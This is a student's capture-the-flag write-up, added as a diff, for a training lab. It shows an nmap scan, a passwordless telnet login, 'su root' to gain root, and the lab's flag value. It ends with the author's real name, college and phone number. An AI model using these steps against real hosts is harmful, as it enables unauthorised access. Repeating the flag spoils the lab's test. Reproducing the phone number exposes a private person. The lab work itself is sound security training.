@@ -1,0 +1,79 @@
+Write-up: Nmap comand lab_23/tcp
+open telnet
+Author: Mr system
+
+Lab Link: https://hackerdna.com/labs/learn-102
+..............................................
+1. Network Reconnaissance (Nmap Scan)
+The work began with network reconnaissance to discover open ports
+on the target IP.
+
+┌─[live@parrot]─[~]
+└──╼ $nmap 34.253.183.190
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-19 02:42 UTC
+Nmap scan report for ec2-34-253-183-190.eu-west-1.compute.amazonaws.com
+(34.253.183.190)
+Host is up (0.25s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT STATE SERVICE
+23/tcp open telnet
+80/tcp open http
+Nmap done: 1 IP address (1 host up) scanned in 18.54 seconds
+Explanation: Nmap discovered two open ports: 23/tcp (telnet) and
+80/tcp (http). This is where an attacker gains initial visibility;
+the presence of Telnet highlights a major security vulnerability
+in communication protocols due to lack of encryption.
+................................................................
+
+2. Exploitation (Telnet Service)
+After discovering Telnet, I proceeded to attempt system access.
+
+┌─[live@parrot]─[~]
+└──╼ $telnet 34.253.183.190
+Trying 34.253.183.190...
+Connected to 34.253.183.190.
+Escape character is '^]'.
+ip-10-0-1-125.eu-west-1.compute.internal login: user
+..............................................................
+
+
+Explanation: At this stage, I tried common usernames like admin
+and toor, but they failed. However, when I tried using user, the
+system let me log in directly without requiring a password. This
+is a severe misconfiguration vulnerability where the user account
+lacks any password protection.
+................................................................
+
+3. Privilege Escalation
+After successfully logging in as user, I looked for a way to
+escalate privileges to root.
+
+ip-10-0-1-125:~$ whoami
+user
+ip-10-0-1-125:~$ su root
+Password:
+/home/user # whoami
+root
+/home/user # ls
+flag-user.txt
+/home/user # cat flag-user.txt
+f47ac10b-58cc-4372-a567-0e02b2c3d479
+/home/user #
+.................................................................
+
+Explanation: I typed su root to elevate privileges. The system
+prompted for a password, and successfully authenticated to grant
+root (administrator) rights. Following that, I gained full control
+of the system, located the flag-user.txt file, and retrieved the
+flag.
+
+
+'''''''''''''''''''''''''''''''''''''''''''''''''
+4. Conclusion & Flag
+Flag Found: f47ac10b-58cc-4372-a567-0e02b2c3d479
+Created by Mr system 
+'''''''''''''''''''''''''''''''''''''''''''''''''
+STUDENT: "INSTITUTE OF ACCONTANCY ARUSHA"- DAR CAMPUS
+REAR NAME: "ZAKAYO RICHARD KAMESE"
+CONTANCT: +255 795 242 866
+.....................................................
